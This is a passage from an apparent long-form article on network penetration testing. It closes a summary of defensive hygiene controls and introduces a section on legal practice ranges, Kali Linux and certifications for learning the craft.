Read as a whole, the pattern is unmistakable: there is no exotic defence in that final column. Patch promptly, do not reuse credentials, disable legacy name-resolution, sign SMB, tier privilege, segment the network, and watch the right event logs. The attacker's sophistication is real, but the controls that defeat the documented techniques are, overwhelmingly, well-understood hygiene applied with discipline. That is precisely why testing matters — not because the fixes are obscure, but because verifying they are actually in place, everywhere, is the only way to know.

14Labs & certifications

Where the craft is actually learned

Network penetration testing is a practical discipline; it is learned by doing, in environments where breaking things carries no consequence. Below: the proving grounds, and the credentials that attest to the skill.

Reading about an attack and executing one are different competencies, and the gap between them closes only with hands-on practice against deliberately vulnerable systems. A mature ecosystem of legal practice ranges exists for exactly this purpose, and the standard offensive distribution — Kali Linux, maintained by OffSec — ships pre-loaded with essentially every tool discussed in this article, from Nmap and Metasploit to Responder, Impacket, and NetExec.51 The path from novice to practitioner generally runs through guided platforms first, then unguided ones, then a domain-focused capstone.
